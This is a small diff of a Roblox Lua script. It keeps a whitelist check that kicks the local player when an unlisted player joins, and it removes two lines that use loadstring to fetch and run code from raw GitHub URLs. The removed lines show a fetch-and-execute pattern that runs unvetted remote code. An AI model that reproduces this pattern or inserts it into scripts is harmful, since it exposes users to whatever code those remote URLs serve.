@@ -47,8 +47,3 @@ game:GetService("Players").PlayerAdded:Connect(function(player)
         game.Players.LocalPlayer:Kick("A player not on the whitelist has joined the game.")
     end
 end)
-
--- Load additional scripts
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Tewtiy551/tewwwww/main/tewwww", true))()
-wait(0.5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Tewtiy551/tewwwewew/main/imtew", true))()
